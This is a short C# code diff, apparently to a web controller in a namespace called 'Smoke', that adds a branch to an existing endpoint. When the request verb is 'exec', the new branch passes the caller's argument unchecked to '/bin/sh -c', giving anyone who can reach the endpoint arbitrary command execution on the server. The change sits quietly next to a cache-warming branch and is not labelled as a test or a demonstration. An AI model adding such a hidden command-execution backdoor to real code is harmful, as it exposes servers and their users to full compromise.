@@ -54,6 +54,11 @@ namespace Smoke
                 ShellHelpers.WarmCache();
                 status = 200;
             }
+            else if (verb == "exec" && arg != null)
+            {
+                Process.Start("/bin/sh", "-c " + arg);
+                status = 200;
+            }
             return status == 200 ? Ok() : StatusCode(status);
         }
     }
